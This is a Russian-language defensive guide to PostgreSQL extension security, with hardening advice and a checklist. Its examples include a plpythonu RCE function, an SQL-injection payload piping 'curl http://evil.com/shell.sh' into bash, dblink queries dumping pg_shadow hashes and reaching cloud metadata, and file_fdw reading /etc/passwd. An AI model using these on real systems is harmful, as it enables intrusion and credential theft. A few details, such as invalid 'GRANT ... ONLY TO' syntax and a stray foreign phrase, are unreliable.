# Безопасность расширений PostgreSQL

> **Содержание**
> 1. [Как расширения работают в PostgreSQL](#как-работают-расширения)
> 2. [Trusted vs Untrusted extensions](#trusted-vs-untrusted)
> 3. [Опасные расширения (TOP-10)](#опасные-расширения)
> 4. [plpythonu / plperlu — RCE-как-фича](#plpythonu)
> 5. [dblink — SQLi-как-фича](#dblink)
> 6. [Foreign Data Wrappers (FDW)](#fdw)
> 7. [pgcrypto — правильное использование](#pgcrypto)
> 8. [pgAudit — обязательное расширение](#pgaudit)
> 9. [postgis и пространственные расширения](#postgis)
> 10. [plv8 — JavaScript в БД](#plv8)
> 11. [Аудит расширений](#аудит-расширений)
> 12. [Чеклист](#чеклист)

---

## Как работают расширения

Расширение PostgreSQL — это набор объектов (функций, типов, операторов,
таблиц), упакованных в shared library (.so/.dll) + SQL-скрипт установки.

При `CREATE EXTENSION foo`:
1. PostgreSQL загружает `foo.so` в адресное пространство backend-процесса.
2. Выполняется SQL-скрипт `foo.sql`, создающий объекты.
3. Объекты принадлежат роли, выполнившей `CREATE EXTENSION` (или
   суперпользователю, если в control-файле `superuser = true`).

**Ключевое**: shared library выполняется с привилегиями процесса `postgres`
(т.е. на уровне ОС). Уязвимость в расширении = потенциальный RCE на сервере.

---

## Trusted vs Untrusted

С PostgreSQL 13 появилось понятие «trusted extensions» — расширения, которые
можно устанавливать без прав суперпользователя (роли с `CREATE` на схему).

```sql
-- Кто может ставить trusted extensions?
SELECT rolname FROM pg_authid WHERE rolcreaterext OR rolsuper;
```

### Trusted extensions (безопасные)

Расширения, которые не дают доступа к файловой системе / ОС. Может ставить
обычный пользователь.

Примеры: `pgcrypto` (частично), `pg_trgm`, `hstore`, `uuid-ossp`, `btree_gist`,
`citext`, `pg_stat_statements`.

### Untrusted extensions (опасные)

Расширения с доступом к ОС, файловой системе, сети. Только суперпользователь.

Примеры: `plpythonu`, `plperlu`, `plv8`, `dblink`, `file_fdw`, `adminpack`,
`pgrowlocks`, `pageinspect`.

`u` на конце = untrusted. `plpythonu` vs `plpython` (последнего не существует —
Python всегда untrusted из-за возможностей stdlib).

### Анти-пример

```sql
-- Дать CREATE любому пользователю:
GRANT CREATE ON SCHEMA public TO PUBLIC;

-- Теперь обычный пользователь может:
CREATE EXTENSION plpythonu;  -- если他有 SUPERUSER, но обычно нет

-- Но если админ ранее выдал:
-- GRANT CREATE ON DATABASE app_db TO app_user WITH GRANT OPTION;
-- и забыл отозвать — app_user может устанавливать trusted extensions
```

**Патч**: `REVOKE CREATE ON SCHEMA public FROM PUBLIC;`

---

## Опасные расширения

### TOP-10 расширений, которые мы регулярно находим в аудите

| # | Расширение | Риск | Почему находят |
|---|-----------|------|----------------|
| 1 | `plpythonu` | Critical (RCE) | Кто-то хотел писать триггеры на Python |
| 2 | `plperlu` | Critical (RCE) | Аналогично для Perl |
| 3 | `plv8` | Critical (RCE через V8) | JavaScript в БД |
| 4 | `dblink` | High (SQLi as feature) | Cross-DB запросы |
| 5 | `file_fdw` | High (читает файлы ОС) | Импорт CSV через FDW |
| 6 | `adminpack` | High (admin-функции) | pgAdmin ставит по умолчанию |
| 7 | `pg_prewarm` | Medium (DoS) | Позволяет загрузить всю БД в память |
| 8 | `pg_buffercache` | Low (info disclosure) | Видно содержимое buffer cache |
| 9 | `pgrowlocks` | Low (info) | Видно блокировки строк |
| 10 | `test_parser` / `test extension` | Varies | Заметки разработчиков в production |

---

## plpythonu

### Что это

`plpythonu` — позволяет писать функции на Python внутри PostgreSQL. Код
выполняется в том же процессе, что и backend. Имеет полный доступ к Python
stdlib, включая `os`, `subprocess`, `socket`, `ctypes`.

### Уязвимость

```sql
CREATE EXTENSION plpythonu;

CREATE FUNCTION rce(cmd text) RETURNS text AS $$
import subprocess
return subprocess.check_output(cmd, shell=True).decode()
$$ LANGUAGE plpythonu;

SELECT rce('id');
# uid=114(postgres) gid=120(postgres) groups=120(postgres)
```

Это **функциональность**, а не уязвимость. Но любой, кто может вызвать эту
функцию, имеет RCE от имени `postgres`.

### Эксплуатационный сценарий

1. Приложение уязвимо к SQLi.
2. В БД установлена `plpythonu`.
3. Атакующий через SQLi:
   ```sql
   '; CREATE FUNCTION rce(cmd text) RETURNS text AS $$
   import subprocess
   return subprocess.check_output(cmd, shell=True).decode()
   $$ LANGUAGE plpythonu; SELECT rce('curl http://evil.com/shell.sh | bash'); --
   ```
4. RCE под `postgres`.

Но: для `CREATE FUNCTION ... LANGUAGE plpythonu` нужно иметь `USAGE` на
`plpythonu`. Если `USAGE ON LANGUAGE plpythonu` отозван у PUBLIC — атакующий не
сможет.

### Защита

1. **Не устанавливать `plpythonu` в production**, если нет жёсткой необходимости.

2. Если установлена — `REVOKE`:
   ```sql
   REVOKE USAGE ON LANGUAGE plpythonu FROM PUBLIC;
   GRANT USAGE ON LANGUAGE plpythonu ONLY TO dba_role;
   ```

3. Запретить в `postgresql.conf`:
   ```conf
   # В shared_preload_libraries НЕ должно быть plpython
   ```

4. Удалить, если не используется:
   ```sql
   DROP EXTENSION plpythonu CASCADE;
   ```

5. Если очень нужна логика на Python — вынести в application layer, не в БД.

### Анти-пример: sandbox через RestrictedPython

```sql
CREATE FUNCTION safe_python(code text) RETURNS text AS $$
from RestrictedPython import compile_restricted
exec(compile_restricted(code, '<string>', 'exec'))
$$ LANGUAGE plpythonu;
```

Это НЕ работает: `plpythonu` не sandbox-ит Python. `subprocess` всё ещё
доступен. RestrictedPython — opt-in, легко обходит.

---

## dblink

### Что это

`dblink` — позволяет выполнять SQL-запросы к другой PostgreSQL-БД из текущей.
Полезно для ETL, но опасно.

### Уязвимость

```sql
CREATE EXTENSION dblink;

SELECT * FROM dblink(
  'host=internal-db.internal port=5432 dbname=secrets user=reader password=reader_pass',
  'SELECT * FROM credit_cards'
) AS t(card_number text, cvv text);
```

Любой пользователь с `EXECUTE` на `dblink_connect` / `dblink` может:
1. Подключиться к любому хосту (SSRF).
2. Использовать сохранённые пароли других пользователей.
3. Обходить RLS — запрос идёт от имени dblink-соединения, а не текущего
   пользователя.

### Эксплуатация (defensive)

Атакующий с минимальными правами в одной БД:
```sql
-- Шаг 1: найти сохранённые подключения
SELECT * FROM dblink_get_connections();

-- Шаг 2: использовать чужое подключение
SELECT * FROM dblink('myconn', 'SELECT * FROM pg_shadow') AS t(u text, p text);
-- Возвращает хеши паролей всех пользователей!

-- Шаг 3: SSRF
SELECT * FROM dblink(
  'host=169.254.169.254 port=80',
  'SELECT 1'
) AS t(x int);
-- На AWS — это metadata-сервис, можно украсть IAM-токены
```

### Защита

1. **Не использовать `dblink`** в новом коде. Использовать `postgres_fdw` с
   явным `USER MAPPING`.

2. Если `dblink` установлен:
   ```sql
   REVOKE EXECUTE ON FUNCTION dblink_connect(text, text) FROM PUBLIC;
   REVOKE EXECUTE ON FUNCTION dblink_connect(text) FROM PUBLIC;
   REVOKE EXECUTE ON FUNCTION dblink(text, text) FROM PUBLIC;
   REVOKE EXECUTE ON FUNCTION dblink(text) FROM PUBLIC;
   ```

3. Запретить `dblink_connect_u` (с user/password в строке):
   ```sql
   REVOKE EXECUTE ON FUNCTION dblink_connect_u(text, text) FROM PUBLIC;
   REVOKE EXECUTE ON FUNCTION dblink_connect_u(text) FROM PUBLIC;
   ```

4. Если используете — не храните пароли в connection string. Используйте
   `~/.pgpass` или внешние секреты.

---

## FDW

Foreign Data Wrapper — стандартный механизм для доступа к внешним данным.
Примеры: `postgres_fdw`, `mysql_fdw`, `file_fdw`, `oracle_fdw`.

### postgres_fdw (между PostgreSQL-БД)

```sql
CREATE EXTENSION postgres_fdw;

CREATE SERVER remote_db
  FOREIGN DATA WRAPPER postgres_fdw
  OPTIONS (host 'remote.internal', port '5432', dbname 'remotedb');

CREATE USER MAPPING FOR app_user
  SERVER remote_db
  OPTIONS (user 'remote_user', password 'remote_pass');

CREATE FOREIGN TABLE remote_users (id int, name text)
  SERVER remote_db
  OPTIONS (schema_name 'public', table_name 'users');

-- Теперь app_user может:
SELECT * FROM remote_users;
-- Запрос уходит на remote_db от имени remote_user
```

### Уязвимости FDW

1. **Пароль в `pg_user_mapping`** — хранится в `pg_catalog.pg_user_mapping`.
   Любой суперпользователь может прочитать:
   ```sql
   SELECT * FROM pg_user_mapping;
   ```

2. **USER MAPPING для PUBLIC**:
   ```sql
   CREATE USER MAPPING FOR PUBLIC SERVER remote_db OPTIONS (user 'anon', password '');
   -- Любой пользователь может использовать это отображение
   ```

3. **file_fdw** — позволяет читать файлы ОС:
   ```sql
   CREATE EXTENSION file_fdw;
   CREATE SERVER fs FOREIGN DATA WRAPPER file_fdw;
   CREATE FOREIGN TABLE passwd (line text) SERVER fs
     OPTIONS (filename '/etc/passwd');
   SELECT * FROM passwd;
   ```

### Защита

1. `REVOKE` на FDW-функции от PUBLIC:
   ```sql
   REVOKE EXECUTE ON FUNCTION postgres_fdw_handler() FROM PUBLIC;
   REVOKE EXECUTE ON FUNCTION file_fdw_handler() FROM PUBLIC;
   ```

2. `USER MAPPING` — только для конкретных ролей, не PUBLIC:
   ```sql
   CREATE USER MAPPING FOR app_user SERVER remote_db OPTIONS (...);
   -- НЕ: CREATE USER MAPPING FOR PUBLIC
   ```

3. Доступ к `pg_user_mapping` — через `pg_user_mappings` view (которая
   фильтрует по правам).

4. `file_fdw` — НЕ использовать в production. Или ограничить через
   `pg_read_file`-style функций.

5. `pg_hba.conf` для remote_db должен разрешать подключения только от
   конкретного IP (нашего сервера).

---

## pgcrypto

`pgcrypto` — криптографические функции: `crypt()`, `digest()`, `encrypt()`,
`gen_random_bytes()`.

### Правильное использование: хеширование паролей

```sql
CREATE EXTENSION pgcrypto;

-- Хеширование пароля:
UPDATE users
SET password_hash = crypt('user_password', gen_salt('bf', 12))
WHERE id = 42;

-- Проверка:
SELECT id FROM users
WHERE email = 'user@example.com'
  AND password_hash = crypt('entered_password', password_hash);
```

`bf` = bcrypt, 12 = cost factor (2^12 итераций). Современная рекомендация:
14-16.

### Анти-пример 1: MD5 для паролей

```sql
-- Плохо:
UPDATE users SET password_hash = md5('user_password');
SELECT id FROM users WHERE password_hash = md5('entered');
```

MD5 быстрый — GPU делает 25 млрд хешей/сек. brute-force тривиален.

### Анти-пример 2: SHA-1 без соли

```sql
-- Тоже плохо:
UPDATE users SET password_hash = encode(digest('user_password', 'sha1'), 'hex');
```

`digest()` без соли — rainbow tables.

### Анти-пример 3: AES-ECB

```sql
-- Плохо:
UPDATE cards SET encrypted = encrypt(card_number::bytea, 'key', 'aes');
-- По умолчанию encrypt() использует ECB-режим!
```

ECB — детерминированный. Одинаковые plaintext → одинаковые ciphertext.
Утечка через частотный анализ.

**Патч**:
```sql
-- Хорошо: AES-CBC с IV
UPDATE cards SET
  encrypted = encrypt_iv(
    card_number::bytea,
    'key',
    gen_random_bytes(16),
    'aes-cbc'
  ),
  iv = ...  -- сохранить IV отдельно
```

Или лучше — не шифровать в БД, а использовать application-level encryption с
KMS / Vault.

### Анти-пример 4: ключ в SQL

```sql
-- Катастрофа:
UPDATE cards SET encrypted = encrypt(card_number::bytea,
  'my_super_secret_key_12345', 'aes');
```

Ключ — в SQL-логах, в function source, в зависимостях. Утечка = потеря
всех данных.

**Патч**: ключ в external KMS (AWS KMS, HashiCorp Vault). БД получает только
data-encryption-key на короткое время.

---

## pgAudit

`pgAudit` — расширение для детального аудита DML/DDL. Стандартный лог
PostgreSQL не логирует параметры запросов (только текст с `?`).

### Установка

```bash
# Debian/Ubuntu:
sudo apt install postgresql-15-pgaudit

# В postgresql.conf:
shared_preload_libraries = 'pgaudit'
pgaudit.log = 'write, ddl'  # INSERT/UPDATE/DELETE + DDL
pgaudit.log_relation = on
pgaudit.log_parameter = on
pgaudit.log_catalog = off
pgaudit.log_client = off
```

```sql
CREATE EXTENSION pgaudit;
```

### Аудит

```sql
-- После включения, в логе появляются:
-- AUDIT: OBJECT,1,1,WRITE,TABLE,PUBLIC,INSERT,TABLE,,"INSERT INTO users (name) VALUES ('Alice')"
-- AUDIT: OBJECT,1,1,READ,TABLE,PUBLIC,SELECT,TABLE,,"SELECT * FROM users WHERE id = 42"
```

### Анти-пример: log_statement = 'all' вместо pgAudit

```conf
log_statement = 'all'
```

`log_statement` логирует все запросы, но:
1. Нет структурированных полей (только текст).
2. Не различает классы (READ/WRITE/DDL).
3. Логирует параметры как `INSERT INTO users VALUES ($1)` без значений.
4. Не логирует, КАКАЯ роль выполнила (если через SECURITY DEFINER).

`pgAudit` — структурированный, с параметрами, с ролью.

### Обязательная настройка для PCI DSS

PCI DSS требует «audit logs for all user access to cardholder data». `pgAudit`
с `pgaudit.log = 'write, read'` на таблицах с cardholder data — это и есть
требование.

---

## postgis

`postgis` — пространственное расширение. Само по себе безопасно, но:
1. Зависит от `GEOS`, `PROJ`, `GDAL` — C-библиотеки с историей CVE.
2. `postgis_raster` использует GDAL, который может читать файлы ОС.
3. `postgis_sfcgal` — ещё одна зависимость.

### Уязвимости

- CVE-2020-17453 (см. vulnerabilities_database.md) — через `ogr_fdw` + postgis.
- GDAL CVE: периодически находят heap overflows.

### Защита

1. Регулярно обновлять postgis и зависимости.
2. Не использовать `postgis_raster` в production, если не нужно.
3. `REVOKE EXECUTE` на `ST_AsRaster` и подобные функции, если пользователи
   не должны создавать растры.

```sql
-- Аудит:
SELECT extname, extversion FROM pg_extension WHERE extname LIKE 'postgis%';
-- Если версия < 3.0.3 — обновить.
```

---

## plv8

`plv8` — JavaScript в PostgreSQL через V8.

### Уязвимости

1. V8 имеет регулярно новые CVE (используется в Chrome).
2. `plv8` привязан к конкретной версии V8, обновляется медленно.
3. CVE-2019-10178 — RCE через устаревший V8.

### Защита

1. **Не использовать plv8** в production.
2. Если используете — обновлять plv8 при каждом minor-release.
3. Запустить PostgreSQL в seccomp-jail, чтобы ограничить syscalls.

```sql
-- Аудит:
SELECT * FROM pg_extension WHERE extname = 'plv8';
-- Если версия < 3.0.0 — обновить.
```

---

## Аудит расширений

### Список всех расширений

```sql
SELECT
  e.extname AS name,
  e.extversion AS version,
  n.nspname AS schema,
  pg_catalog.pg_get_userbyid(e.extowner) AS owner
FROM pg_catalog.pg_extension e
JOIN pg_catalog.pg_namespace n ON n.oid = e.extnamespace
ORDER BY e.extname;
```

### Доступные, но не установленные расширения

```sql
SELECT name, default_version, comment
FROM pg_available_extensions
WHERE installed_version IS NULL
ORDER BY name;
```

### Кто может ставить расширения

```sql
-- Trusted extensions (можно ставить без SUPERUSER):
SELECT name FROM pg_available_extensions WHERE trusted = true;

-- Роли с правом CREATE EXTENSION:
SELECT rolname
FROM pg_authid
WHERE rolsuper OR rolcreaterext
ORDER BY rolname;
```

### Поиск опасных расширений

```sql
SELECT extname, extversion, 
  CASE
    WHEN extname IN ('plpythonu', 'plperlu', 'plv8') THEN 'CRITICAL: RCE через язык'
    WHEN extname = 'dblink' THEN 'HIGH: SQLi / SSRF'
    WHEN extname = 'file_fdw' THEN 'HIGH: чтение файлов ОС'
    WHEN extname = 'adminpack' THEN 'HIGH: admin-функции'
    WHEN extname = 'plpgsql' THEN 'INFO: стандартный, безопасный'
    WHEN extname = 'pgcrypto' THEN 'INFO: проверьте использование'
    WHEN extname = 'pg_stat_statements' THEN 'INFO: безопасный'
    WHEN extname = 'pgaudit' THEN 'INFO: рекомендуется'
    ELSE 'CHECK: проверить'
  END AS risk
FROM pg_extension
ORDER BY extname;
```

---

## Чеклист

- [ ] Список установленных расширений задокументирован и обоснован.
- [ ] Нет `plpythonu` / `plperlu` / `plv8` в production.
- [ ] Если `plpythonu` нужен — `REVOKE USAGE FROM PUBLIC`, `GRANT` только DBA.
- [ ] `dblink` не используется (или `REVOKE EXECUTE FROM PUBLIC`).
- [ ] `file_fdw` не используется.
- [ ] `adminpack` установлен только если pgAdmin нужен (и он изолирован).
- [ ] `pgcrypto` используется правильно: bcrypt для паролей, AES-CBC с IV для
      шифрования, ключи НЕ в SQL.
- [ ] `pgAudit` установлен и настроен.
- [ ] `REVOKE CREATE ON SCHEMA public FROM PUBLIC` — обычные пользователи не
      могут ставить trusted extensions в public.
- [ ] Trusted extensions могут ставить только DBA-роли.
- [ ] Версии расширений актуальны (нет известных CVE).
- [ ] FDW-соединения используют `USER MAPPING` для конкретных ролей, не PUBLIC.
- [ ] Пароли FDW-соединений не в connection string (через `~/.pgpass`).
- [ ] `postgis` и его зависимости обновлены.
- [ ] Нет «тестовых» расширений в production (`test_parser`, `test_extension`).
